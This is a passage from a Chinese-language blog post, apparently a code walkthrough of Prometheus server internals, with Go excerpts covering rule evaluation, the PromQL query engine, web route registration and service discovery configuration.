ar.currentAlerts()...)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">numOutOfOrder = <span class="number">0</span></span><br><span class="line">numDuplicates = <span class="number">0</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">app, err := g.opts.Appendable.Appender()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Warn(g.logger).Log(<span class="string">"msg"</span>, <span class="string">"creating appender failed"</span>, <span class="string">"err"</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">seriesReturned := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]labels.Labels, <span class="built_in">len</span>(g.seriesInPreviousEval[i]))</span><br><span class="line"><span class="keyword">for</span> _, s := <span class="keyword">range</span> vector &#123;</span><br><span class="line"><span class="keyword">if</span> _, err := app.Add(s.Metric, s.T, s.V); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">switch</span> err &#123;</span><br><span class="line"><span class="keyword">case</span> storage.ErrOutOfOrderSample:</span><br><span class="line">numOutOfOrder++</span><br><span class="line">level.Debug(g.logger).Log(<span class="string">"msg"</span>, <span class="string">"Rule evaluation result discarded"</span>, <span class="string">"err"</span>, err, <span class="string">"sample"</span>, s)</span><br><span class="line"><span class="keyword">case</span> storage.ErrDuplicateSampleForTimestamp:</span><br><span class="line">numDuplicates++</span><br><span class="line">level.Debug(g.logger).Log(<span class="string">"msg"</span>, <span class="string">"Rule evaluation result discarded"</span>, <span class="string">"err"</span>, err, <span class="string">"sample"</span>, s)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">level.Warn(g.logger).Log(<span class="string">"msg"</span>, <span class="string">"Rule evaluation result discarded"</span>, <span class="string">"err"</span>, err, <span class="string">"sample"</span>, s)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">seriesReturned[s.Metric.String()] = s.Metric</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> numOutOfOrder &gt; <span class="number">0</span> &#123;</span><br><span class="line">level.Warn(g.logger).Log(<span class="string">"msg"</span>, <span class="string">"Error on ingesting out-of-order result from rule evaluation"</span>, <span class="string">"numDropped"</span>, numOutOfOrder)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> numDuplicates &gt; <span class="number">0</span> &#123;</span><br><span class="line">level.Warn(g.logger).Log(<span class="string">"msg"</span>, <span class="string">"Error on ingesting results from rule evaluation with different value but same timestamp"</span>, <span class="string">"numDropped"</span>, numDuplicates)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> metric, lset := <span class="keyword">range</span> g.seriesInPreviousEval[i] &#123;</span><br><span class="line"><span class="keyword">if</span> _, ok := seriesReturned[metric]; !ok &#123;</span><br><span class="line"><span class="comment">// Series no longer exposed, mark it stale.</span></span><br><span class="line">_, err = app.Add(lset, timestamp.FromTime(ts), math.Float64frombits(value.StaleNaN))</span><br><span class="line"><span class="keyword">switch</span> err &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="literal">nil</span>:</span><br><span class="line"><span class="keyword">case</span> storage.ErrOutOfOrderSample, storage.ErrDuplicateSampleForTimestamp:</span><br><span class="line"><span class="comment">// Do not count these in logging, as this is expected if series</span></span><br><span class="line"><span class="comment">// is exposed from a different rule.</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">level.Warn(g.logger).Log(<span class="string">"msg"</span>, <span class="string">"adding stale sample failed"</span>, <span class="string">"sample"</span>, metric, <span class="string">"err"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := app.Commit(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Warn(g.logger).Log(<span class="string">"msg"</span>, <span class="string">"rule sample appending failed"</span>, <span class="string">"err"</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">g.seriesInPreviousEval[i] = seriesReturned</span><br><span class="line">&#125;</span><br><span class="line">&#125;(i, rule)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>规则调度的流程：</p><p><img src="/images/1572412222861.png" alt="1572412222861"></p><h2 id="QueryEngine"><a href="#QueryEngine" class="headerlink" title="QueryEngine"></a>QueryEngine</h2><p>queryengine是核心模块，规则分为告警规则和记录规则，告警规则会产生告警信息，通过通知组件发送给告警服务，告警规则的计算表达式可以引用记录规则。</p><p>Rule接口：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// A Rule encapsulates a vector expression which is evaluated at a specified</span></span><br><span class="line"><span class="comment">// interval and acted upon (currently either recorded or used for alerting).</span></span><br><span class="line"><span class="keyword">type</span> Rule <span class="keyword">interface</span> &#123;</span><br><span class="line">Name() <span class="keyword">string</span></span><br><span class="line"><span class="comment">// eval evaluates the rule, including any associated recording or alerting actions.</span></span><br><span class="line">Eval(context.Context, time.Time, QueryFunc, *url.URL) (promql.Vector, error)</span><br><span class="line"><span class="comment">// String returns a human-readable string representation of the rule.</span></span><br><span class="line">String() <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line">SetEvaluationTime(time.Duration)</span><br><span class="line">GetEvaluationTime() time.Duration</span><br><span class="line"><span class="comment">// HTMLSnippet returns a human-readable string representation of the rule,</span></span><br><span class="line"><span class="comment">// decorated with HTML elements for use the web frontend.</span></span><br><span class="line">HTMLSnippet(pathPrefix <span class="keyword">string</span>) html_template.HTML</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两种规则都是通过实现Rule接口中的Eval方法来完成。</p><p>1）告警状态为StatePending时候，告警持续时间必须大于等于告警规则所配置的持续时间。</p><p>2）告警状态为StateFiring</p><p>告警规则和记录规则Eval方法的实现代码路径为rules/alerting和reording.go</p><p>查询引擎通过EngineQueryFunc方法完成了在RuleManager中的注册。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// QueryFunc processes PromQL queries.</span></span><br><span class="line"><span class="keyword">type</span> QueryFunc <span class="function"><span class="keyword">func</span><span class="params">(ctx context.Context, q <span class="keyword">string</span>, t time.Time)</span> <span class="params">(promql.Vector, error)</span></span></span><br></pre></td></tr></table></figure><p>规则在查询引擎中运算之前，需要调用Engine.NewInstantQuery方法初始化，完成对规则的解析和对查询器的构建。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// NewInstantQuery returns an evaluation query for the given expression at the given time.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ng *Engine)</span> <span class="title">NewInstantQuery</span><span class="params">(qs <span class="keyword">string</span>, ts time.Time)</span> <span class="params">(Query, error)</span></span> &#123;</span><br><span class="line">expr, err := ParseExpr(qs)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">qry := ng.newQuery(expr, ts, ts, <span class="number">0</span>)</span><br><span class="line">qry.q = qs</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> qry, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>规则允许的调用链为:</p><p>query.Exec-&gt;Engine.exec-&gt;Engine.execEvalStmt-&gt;evaluator.eval。最为关键的部分在evaluator.eval方法中实现。</p><p>支持的表达式类型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AggregateExpr</span><br><span class="line">BinaryExpr</span><br><span class="line">Call</span><br><span class="line">MatrixSelector</span><br><span class="line">NumberLiteral</span><br><span class="line">ParenExpr</span><br><span class="line">StringLiteral</span><br><span class="line">UnaryExpr</span><br><span class="line">VectorSelector</span><br></pre></td></tr></table></figure><p>enginequery模块主要代码在promql目录下；</p><p>ast.go定义查询引擎中常用的结构</p><p>engine.go具体实现</p><p>functions.go实现查询引擎的内置方法</p><p>fuzz.go，parse.go实现两种各不同的表达式解析器</p><p>printer.go, quantile.go, value.go 查询引擎的公共基础方法</p><p>BinaryExpr运算：</p><p><img src="/images/1572413062094.png" alt="1572413062094"></p><p>时间窗口规则运算：</p><p><img src="/images/1572413083570.png" alt="1572413083570"></p><p>规则计算和指标查询：</p><p>查询引擎在规则运算过程中，先对规则进行解析，然后解析后的规则转换成为对应类型的表达式，最后根据转换后的表达式和数据完成规则计算。</p><p>查询引擎是通过调用读写代理器fanoutStorage中的Querier方法获取指标数据的。 Querier方法的主要参数为指标名称，开始时间和结束时间。</p><p>加入指标查询后的规则运算调用链为： query.Exec=&gt;Engine.Exec=&gt;Engine.execEvalStat=&gt;Engine.populateIterators=&gt;Engine.queryable.Querier=&gt;evaluator.eval</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>web组件引用了localStorage组件，fanoutStorage组件，scrapeManager组件，ruleManager组件和notifier组件，对外提供http服务。</p><p>prometheus server服务的handler的数据结构如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Handler serves various HTTP endpoints of the Prometheus server</span></span><br><span class="line"><span class="keyword">type</span> Handler <span class="keyword">struct</span> &#123;</span><br><span class="line">logger log.Logger</span><br><span class="line"></span><br><span class="line">scrapeManager *retrieval.ScrapeManager</span><br><span class="line">ruleManager   *rules.Manager</span><br><span class="line">queryEngine   *promql.Engine</span><br><span class="line">context       context.Context</span><br><span class="line">tsdb          <span class="function"><span class="keyword">func</span><span class="params">()</span> *<span class="title">tsdb</span>.<span class="title">DB</span></span></span><br><span class="line">storage       storage.Storage</span><br><span class="line">notifier      *notifier.Notifier</span><br><span class="line"></span><br><span class="line">apiV1 *api_v1.API</span><br><span class="line"></span><br><span class="line">router       *route.Router</span><br><span class="line">quitCh       <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">reloadCh     <span class="keyword">chan</span> <span class="keyword">chan</span> error</span><br><span class="line">options      *Options</span><br><span class="line">config       *config.Config</span><br><span class="line">configString <span class="keyword">string</span></span><br><span class="line">versionInfo  *PrometheusVersion</span><br><span class="line">birth        time.Time</span><br><span class="line">cwd          <span class="keyword">string</span></span><br><span class="line">flagsMap     <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span></span><br><span class="line"></span><br><span class="line">externalLabels model.LabelSet</span><br><span class="line">mtx            sync.RWMutex</span><br><span class="line">now            <span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="title">model</span>.<span class="title">Time</span></span></span><br><span class="line"></span><br><span class="line">ready <span class="keyword">uint32</span> <span class="comment">// ready is uint32 rather than boolean to be able to use atomic functions.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>web初始化再main中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webHandler := web.New(log.With(logger, <span class="string">"component"</span>, <span class="string">"web"</span>), &amp;cfg.web)</span><br></pre></td></tr></table></figure><p>注册api接口：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">New</span><span class="params">(logger log.Logger, o *Options)</span> *<span class="title">Handler</span></span> &#123;</span><br><span class="line">router := route.New()</span><br><span class="line">cwd, err := os.Getwd()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">cwd = <span class="string">"&lt;error retrieving current working directory&gt;"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> logger == <span class="literal">nil</span> &#123;</span><br><span class="line">logger = log.NewNopLogger()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">h := &amp;Handler&#123;</span><br><span class="line">logger:      logger,</span><br><span class="line">router:      router,</span><br><span class="line">quitCh:      <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;),</span><br><span class="line">reloadCh:    <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">chan</span> error),</span><br><span class="line">options:     o,</span><br><span class="line">versionInfo: o.Version,</span><br><span class="line">birth:       time.Now(),</span><br><span class="line">cwd:         cwd,</span><br><span class="line">flagsMap:    o.Flags,</span><br><span class="line"></span><br><span class="line">context:       o.Context,</span><br><span class="line">scrapeManager: o.ScrapeManager,</span><br><span class="line">ruleManager:   o.RuleManager,</span><br><span class="line">queryEngine:   o.QueryEngine,</span><br><span class="line">tsdb:          o.TSDB,</span><br><span class="line">storage:       o.Storage,</span><br><span class="line">notifier:      o.Notifier,</span><br><span class="line"></span><br><span class="line">now: model.Now,</span><br><span class="line"></span><br><span class="line">ready: <span class="number">0</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">h.apiV1 = api_v1.NewAPI(h.queryEngine, h.storage, h.scrapeManager, h.notifier,</span><br><span class="line"><span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="title">config</span>.<span class="title">Config</span></span> &#123;</span><br><span class="line">h.mtx.RLock()</span><br><span class="line"><span class="keyword">defer</span> h.mtx.RUnlock()</span><br><span class="line"><span class="keyword">return</span> *h.config</span><br><span class="line">&#125;,</span><br><span class="line">h.testReady,</span><br><span class="line">h.options.TSDB,</span><br><span class="line">h.options.EnableAdminAPI,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> o.RoutePrefix != <span class="string">"/"</span> &#123;</span><br><span class="line"><span class="comment">// If the prefix is missing for the root path, prepend it.</span></span><br><span class="line">router.Get(<span class="string">"/"</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">http.Redirect(w, r, o.RoutePrefix, http.StatusFound)</span><br><span class="line">&#125;)</span><br><span class="line">router = router.WithPrefix(o.RoutePrefix)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">instrh := prometheus.InstrumentHandler</span><br><span class="line">instrf := prometheus.InstrumentHandlerFunc</span><br><span class="line">readyf := h.testReady</span><br><span class="line"></span><br><span class="line">router.Get(<span class="string">"/"</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">http.Redirect(w, r, path.Join(o.ExternalURL.Path, <span class="string">"/graph"</span>), http.StatusFound)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.Get(<span class="string">"/alerts"</span>, readyf(instrf(<span class="string">"alerts"</span>, h.alerts)))   <span class="comment">//alerts信息</span></span><br><span class="line">router.Get(<span class="string">"/graph"</span>, readyf(instrf(<span class="string">"graph"</span>, h.graph)))      <span class="comment">//graph接口</span></span><br><span class="line">router.Get(<span class="string">"/status"</span>, readyf(instrf(<span class="string">"status"</span>, h.status)))    <span class="comment">//status状态</span></span><br><span class="line">router.Get(<span class="string">"/flags"</span>, readyf(instrf(<span class="string">"flags"</span>, h.flags)))</span><br><span class="line">router.Get(<span class="string">"/config"</span>, readyf(instrf(<span class="string">"config"</span>, h.serveConfig)))</span><br><span class="line">router.Get(<span class="string">"/rules"</span>, readyf(instrf(<span class="string">"rules"</span>, h.rules)))      <span class="comment">//rules</span></span><br><span class="line">router.Get(<span class="string">"/targets"</span>, readyf(instrf(<span class="string">"targets"</span>, h.targets))) <span class="comment">// Bucket targets by job label</span></span><br><span class="line">router.Get(<span class="string">"/version"</span>, readyf(instrf(<span class="string">"version"</span>, h.version)))</span><br><span class="line">router.Get(<span class="string">"/service-discovery"</span>, readyf(instrf(<span class="string">"servicediscovery"</span>, h.serviceDiscovery)))</span><br><span class="line"><span class="comment">//服务发现</span></span><br><span class="line">router.Get(<span class="string">"/heap"</span>, instrf(<span class="string">"heap"</span>, h.dumpHeap))</span><br><span class="line"></span><br><span class="line">router.Get(<span class="string">"/metrics"</span>, prometheus.Handler().ServeHTTP)</span><br><span class="line"><span class="comment">//当前所有指标数据</span></span><br><span class="line">router.Get(<span class="string">"/federate"</span>, readyf(instrh(<span class="string">"federate"</span>, httputil.CompressionHandler&#123;</span><br><span class="line">Handler: http.HandlerFunc(h.federation),</span><br><span class="line">&#125;)))</span><br><span class="line"></span><br><span class="line">router.Get(<span class="string">"/consoles/*filepath"</span>, readyf(instrf(<span class="string">"consoles"</span>, h.consoles)))</span><br><span class="line"></span><br><span class="line">router.Get(<span class="string">"/static/*filepath"</span>, instrf(<span class="string">"static"</span>, h.serveStaticAsset))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> o.UserAssetsPath != <span class="string">""</span> &#123;</span><br><span class="line">router.Get(<span class="string">"/user/*filepath"</span>, instrf(<span class="string">"user"</span>, route.FileServe(o.UserAssetsPath)))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> o.EnableLifecycle &#123;</span><br><span class="line">router.Post(<span class="string">"/-/quit"</span>, h.quit)</span><br><span class="line">router.Post(<span class="string">"/-/reload"</span>, h.reload)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">router.Post(<span class="string">"/-/quit"</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, _ *http.Request)</span></span> &#123;</span><br><span class="line">w.WriteHeader(http.StatusForbidden)</span><br><span class="line">w.Write([]<span class="keyword">byte</span>(<span class="string">"Lifecycle APIs are not enabled"</span>))</span><br><span class="line">&#125;)</span><br><span class="line">router.Post(<span class="string">"/-/reload"</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, _ *http.Request)</span></span> &#123;</span><br><span class="line">w.WriteHeader(http.StatusForbidden)</span><br><span class="line">w.Write([]<span class="keyword">byte</span>(<span class="string">"Lifecycle APIs are not enabled"</span>))</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">router.Get(<span class="string">"/-/quit"</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, _ *http.Request)</span></span> &#123;</span><br><span class="line">w.WriteHeader(http.StatusMethodNotAllowed)</span><br><span class="line">w.Write([]<span class="keyword">byte</span>(<span class="string">"Only POST requests allowed"</span>))</span><br><span class="line">&#125;)</span><br><span class="line">router.Get(<span class="string">"/-/reload"</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, _ *http.Request)</span></span> &#123;</span><br><span class="line">w.WriteHeader(http.StatusMethodNotAllowed)</span><br><span class="line">w.Write([]<span class="keyword">byte</span>(<span class="string">"Only POST requests allowed"</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.Get(<span class="string">"/debug/*subpath"</span>, serveDebug)</span><br><span class="line">router.Post(<span class="string">"/debug/*subpath"</span>, serveDebug)</span><br><span class="line"></span><br><span class="line">router.Get(<span class="string">"/-/healthy"</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">w.WriteHeader(http.StatusOK)</span><br><span class="line">fmt.Fprintf(w, <span class="string">"Prometheus is Healthy.\n"</span>)</span><br><span class="line">&#125;)</span><br><span class="line">router.Get(<span class="string">"/-/ready"</span>, readyf(<span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">w.WriteHeader(http.StatusOK)</span><br><span class="line">fmt.Fprintf(w, <span class="string">"Prometheus is Ready.\n"</span>)</span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> h</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>reload接口调用发送信号给reloadCh，重新加载配置。web主要内容就这些。</p><h2 id="DiscoveryManager"><a href="#DiscoveryManager" class="headerlink" title="DiscoveryManager"></a>DiscoveryManager</h2><p>数据采集之前，prometheus需要先发现数据采集的目标服务，然后从目标服务中获取指标数据，最后将指标数据存储到prometheus存储管理器中。</p><p>服务发现结构配置：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// ServiceDiscoveryConfig configures lists of different service discovery mechanisms.</span></span><br><span class="line"><span class="keyword">type</span> ServiceDiscoveryConfig <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="comment">// List of labeled target groups for this job.</span></span><br><span class="line">StaticConfigs []*targetgroup.Group <span class="string">`yaml:"static_configs,omitempty"`</span></span><br><span class="line"><span class="comment">// List of DNS service discovery configurations.</span></span><br><span class="line">DNSSDConfigs []*dns.SDConfig <span class="string">`yaml:"dns_sd_configs,omitempty"`</span></span><br><span class="line"><span class="comment">// List of file service discovery configurations.</span></span><br><span class="line">FileSDConfigs []*file.SDConfig <span class="string">`yaml:"file_sd_configs,omitempty"`</span></span><br><span class="line"><span class="comment">// List of Consul service discovery configurations.</span></span><br><span class="line">ConsulSDConfigs []*consul.SDConfig <span class="string">`yaml:"consul_sd_configs,omitempty"`</span></span><br><span class="line"><span class="comment">// List of Serverset service discovery configurations.</span></span><br><span class="line">ServersetSDConfigs []*zookeeper.ServersetSDConfig <span class="string">`yaml:"serverset_sd_configs,omitempty"`</span></span><br><span class="line"><span class="comment">// NerveSDConfigs is a list of Nerve service discovery configurations.</span></span><br><span class="line">NerveSDConfigs []*zookeeper.NerveSDConfig <span class="string">`yaml:"nerve_sd_configs,omitempty"`</span></span><br><span class="line"><span class="comment">// MarathonSDConfigs is a list of Marathon service discovery configurations.</span></span><br><span class="line">MarathonSDConfigs []*marathon.SDConfig <span class="string">`yaml:"marathon_sd_configs,omitempty"`</span></span><br><span class="line"><span class="comment">// List of Kubernetes service discovery configurations.</span></span><br><span class="line">KubernetesSDConfigs []*kubernetes.SDConfig <span class="string">`yaml:"kubernetes_sd_configs,omitempty"`</span></span><br><span class="line"><span class="comment">// List of GCE service discovery configurations.</span></span><br><span class="line">GCESDConfigs []*gce.SDConfig <span class="string">`yaml:"gce_sd_configs,omitempty"`</span></span><br><span class="line"><span class="comment">// List of EC2 service discovery configurations.</span></span><br><span class="line">EC2SDConfigs []*ec2.SDConfig <span class="string">`yaml:"ec2_sd_configs,omitempty"`</span></span><br><span class="line"><span class="comment">// List of OpenStack service discovery configurations.</span></span><br><span class="line">OpenstackSDConfigs []*openstack.SDConfig <span class="string">`yaml:"openstack_sd_configs,omitempty"`</span></span><br><span class="line"><span class="comment">// List of Azure service discovery configurations.</span></span><br><span class="line">AzureSDConfigs []*azure.SDConfig <span class="string">`yaml:"azure_sd_configs,omitempty"`</span></span><br><span class="line"><span class="comment">// List of Triton service discovery configurations.</span></span><br><span class="line">TritonSDConfigs []*triton.SDConfig <span class="string">`yaml:"triton_sd_configs,omitempty"`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Catches all undefined fields and must be empty after parsing.</span></span><br><span class="line">XXX <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>&#123;&#125; <span class="string">`yaml:",inline"`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>prometheus支持以上服务，除了StaticConfigs静态服务配置，其他都是动态的服务配置。</p><p>对所有的服务发现，都提供一个抽象接口：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Discoverer <span class="keyword">interface</span> &#123;</span><br><span class="line"><span class="comment">// Run hands a channel to the discovery provider(consul,dns etc) through which it can send</span></span><br><span class="line"><span class="comment">// updated target groups.</span></span><br><span class="line"><span class="comment">// Must returns if the context gets canceled. It should not close the update</span></span><br><span class="line"><span class="comment">// channel on returning.</span></span><br><span class="line">Run(ctx context.Context, up <span class="keyword">chan</span>&lt;- []*targetgroup.Group)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>prometheus将所发现的服务都转换成为了targetGroup.Group结构，通过 up发送给ScrapeManager，完成服务上线。</p><p>代码路径：/discovery/targetgroup/targetgroup.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Group is a set of targets with a common label set(production , test, staging etc.).</span></span><br><span class="line"><span class="keyword">type</span> Group <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="comment">// Targets is a list of targets identified by 